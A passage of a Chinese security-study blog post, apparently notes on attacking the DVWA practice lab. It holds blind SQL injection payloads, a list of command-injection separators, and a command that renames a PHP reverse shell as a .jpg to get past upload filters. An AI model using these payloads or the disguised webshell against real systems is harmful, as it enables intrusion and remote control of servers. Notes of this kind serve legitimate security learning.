+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;\&#x27;</span>dvwa\<span class="string">&#x27;#&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">#可以用table_schema<span class="operator">=</span>database()</span><br><span class="line">#table_schema<span class="operator">=</span><span class="number">0x64767761</span>（十六进制的dvwa）</span><br></pre></td></tr></table></figure>
+
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>服务器只返回yes or no</p>
+<p>如果提交的是1#，返回yes，提交1’#也正常返回，说明是字符型，会闭合单引号</p>
+<p>盲注payload一般使用and逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">判断字段数，这里id值要选存在的</span><br><span class="line">id=&#x27;1&#x27; order by 3# </span><br><span class="line"></span><br><span class="line">使用union select，这里id值要选不存在的</span><br><span class="line">不能用id=&#x27;1&#x27; union select 1,2#，因为union相当于或的关系，id=&#x27;1&#x27;为true，整体一定为true，无法根据返回的yes或no来判断</span><br><span class="line"></span><br><span class="line">盲注数据库名，使用SUBSTRING(database(),1,1)，表示从第一个字符开始，取一个字符</span><br><span class="line"></span><br><span class="line">and SUBSTRING(BIN(ASCII(SUBSTRING(database(),1,1))),4,1)&gt;0#</span><br><span class="line">表示取数据库名的第一个字母，转成二进制的ASCII码，一共7位，这里判断的是第四位是否为1</span><br></pre></td></tr></table></figure>
+
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>分隔不同命令的符号有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; | &amp; &amp;&amp;</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /usr/share/webshells/php/php-reverse-shell.php ./shell3.jpg</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E6%8B%BF%E6%9D%83%E9%99%90"><span class="toc-number">1.</span> <span class="toc-text">Web拿权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%BB%93%E5%90%88%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E8%BE%BE%E5%88%B0RCE"><span class="toc-number">1.1.</span> <span class="toc-text">文件包含漏洞结合访问日志达到RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9B%AE%E5%BD%95"><span class="toc-number">2.</span> <span class="toc-text">常见目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">3.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WordPress"><span class="toc-number">4.</span> <span class="toc-text">WordPress</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebDav"><span class="toc-number">5.</span> <span class="toc-text">WebDav</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-UDF%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">6.</span> <span class="toc-text">MySQL UDF执行命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">7.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">8.</span> <span class="toc-text">伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">9.1.</span> <span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">11.</span> <span class="toc-text">其他</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/05/Web-Application-Attack/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/05/Web-Application-Attack/&text=Web Application Attack"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/05/Web-Application-Attack/&title=Web Application Attack"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/05/Web-Application-Attack/&is_video=false&description=Web Application Attack"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Web Application Attack&body=Check out this article: http://example.com/2024/06/05/Web-Application-Attack/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/05/Web-Application-Attack/&title=Web Application Attack"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/05/Web-Application-Attack/&title=Web Application Attack"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/05/Web-Application-Attack/&title=Web Application Attack"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/05/Web-Application-Attack/&title=Web Application Attack"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/05/Web-Application-Attack/&name=Web Application Attack&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/05/Web-Application-Attack/&t=Web Application Attack"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2010-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
